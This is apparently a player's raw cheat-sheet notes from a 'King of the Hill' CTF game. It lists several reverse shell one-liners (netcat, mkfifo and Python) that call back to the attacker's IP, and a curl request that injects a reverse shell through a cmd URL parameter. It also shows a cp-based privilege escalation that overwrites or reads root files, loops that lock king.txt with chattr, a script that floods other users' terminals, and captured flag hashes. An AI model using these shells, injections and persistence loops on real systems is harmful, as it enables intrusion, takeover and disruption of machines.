My Ip : 10.11.43.119

Target ip : 10.10.40.155


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.43.119 4444

nc -e /bin/bash 10.11.43.119 4444

:3000?cmd
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.11.43.119",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'

```bash


```

cat root.txt 
218f5ea7a4d711eef60171e5c92ba9e1

user bunny
cat user.txt
79973eb57d0188ffc6c85a1a4e57a516

user jordan
cat user.txt 
79973eb57d0188ffc6c85a1a4e57a516

```bash
curl 'http://10.10.77.27:3000/?cmd=python%20-c%20%27a=__import__;s=a(%22socket%22).socket;o=a(%22os%22).dup2;p=a(%22pty%22).spawn;c=s();c.connect((%2210.8.226.18%22,4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(%22/bin/sh%22)%27'

python -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

Ctrl + Z

stty raw -echo; fg

echo "message" > /dev/pts/2

```

After trying a lot of tests and linPEAS, I found that the easiest method to get king AND root shell is to exploit the cp vulnerability on the box. I am leaving the ideas to you for this one, but after making you king.

LFILE=/root/king.txt
echo "<YOUR USERNAME>" | cp /dev/stdin "$LFILE"
echo "Ayush5091" | cp /dev/stdin "$LFILE"

YOU ARE KING. NOW DEFEND YOUR TITILE.
Free Tip: (You know you can read anyfile with this vuln, use your imagination.)
LFILE=file_to_read
cp "$LFILE" /dev/stdout

```bash
while true;do chattr -i /root/king.txt;echo "Ayush5091" > /root/king.txt;done
```
```py
#!/usr/bin/python
import os

while True:
	for i in range(2,100):
		os.system('echo "Never ever let you go\n" > /dev/pts/{i}')

```

```bash
#!/bin/bash
while [ 1 ]
do

    sleep 2
done
chattr -i /root/king.txt;echo "Ayush5091" > /root/king.txt;chattr +i /root/king.txt



while [ 1 ]; do chattr -i /root/king.txt;echo "Ayush5091" > /root/king.txt;chattr +i /root/king.txt;sleep 3 ;done   


while [ 1 ]; do echo a;sleep 3 ;done 
```